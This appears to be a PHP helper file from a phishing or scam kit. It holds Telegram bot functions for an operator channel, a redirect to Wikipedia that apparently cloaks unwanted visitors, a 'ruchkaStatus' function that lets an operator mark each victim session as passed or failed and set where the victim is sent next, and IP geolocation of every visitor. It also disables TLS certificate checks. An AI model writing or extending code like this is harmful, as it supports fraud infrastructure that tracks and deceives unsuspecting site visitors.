<?php
function request($url, $post = false, $rh = false) {
	$curl = curl_init($url);
	curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
	if ($rh)
		curl_setopt($curl, CURLOPT_HEADER, true);
	if ($post) {
		curl_setopt($curl, CURLOPT_POST, true);
		curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($post));
	}
	$result = curl_exec($curl);
	curl_close($curl);
	return $result;
}

function botKeybd($v) {
	if ($v[0])
		return [
			'inline_keyboard' => $v[1]
		];
	else
		return [
			'keyboard' => $v[1],
			'resize_keyboard' => true,
			'one_time_keyboard' => false
		];
}

function botUrl($n) {
	return 'https://api.telegram.org/bot'.tgToken.'/'.$n;
}

function botSend($msg, $tgToken = '', $id = false, $kb = false) {
	if (!$id)
		return false;
	if (is_array($msg))
		$msg = implode("\n", $msg);
	$post = [
		'parse_mode' => 'html',
		'disable_web_page_preview' => 'true',
		'chat_id' => $id,
		'text' => $msg,
	];
	if ($kb)
		$post['reply_markup'] = json_encode(botKeybd($kb));
	return json_decode(request(botUrl('sendMessage'), $post), true)['ok'];
}

function botEdit($msg, $mid, $id, $kb = false) {
	if (is_array($msg))
		$msg = implode("\n", $msg);
	$post = [
		'parse_mode' => 'html',
		'disable_web_page_preview' => 'true',
		'chat_id' => $id,
		'message_id' => $mid,
		'text' => $msg,
	];
	if ($kb)
		$post['reply_markup'] = json_encode(botKeybd($kb));
	request(botUrl('editMessageText'), $post);
}

function botDelete($mid, $id) {
	$post = [
		'chat_id' => $id,
		'message_id' => $mid,
	];
	request(botUrl('deleteMessage'), $post);
}

function loadSite() {
	header('Location: https://www.wikipedia.org/');
	exit();
}

function beaText($v, $c) {
	$t = '';
	for ($i = 0; $i < strlen($v); $i++)
		if (strpos($c, $v[$i]) !== false)
			$t .= $v[$i];
	return $t;
}

function chsNum() {
	return '0123456789';
}

function ruchkaStatus($t, $state, $errmsg = '', $redirect = '') {
    $response = json_decode(file_get_contents("database/" . $t), true);
    if ($state === true) {
        $status = 'success';
    } else {
        $status = 'fail';
    }
    $response['status'] = $status;
    $response['errmsg'] = $errmsg;
    $response['redirect'] = $redirect; // Добавьте это поле для хранения URL перенаправления
    file_put_contents("database/" . $t, json_encode($response));
}

    $ipcheck = file_get_contents('http://ip-api.com/json/'.$_SERVER['REMOTE_ADDR']);
    
    if(!empty($ipcheck)) {
        $ipapi = json_decode($ipcheck);
        if(!empty($ipapi->{'country'})) {
            $visitor['country'] = $ipapi->{'country'};
        } else {
            $visitor['country'] = 'Неизвестно';
        }
        if(!empty($ipapi->{'city'})) {
            $visitor['city'] = $ipapi->{'city'};
        } else {
            $visitor['city'] = 'Неизвестно';
        }
    } else {
        $visitor['country'] = 'Неизвестно';
        $visitor['city'] = 'Неизвестно';
    }
?>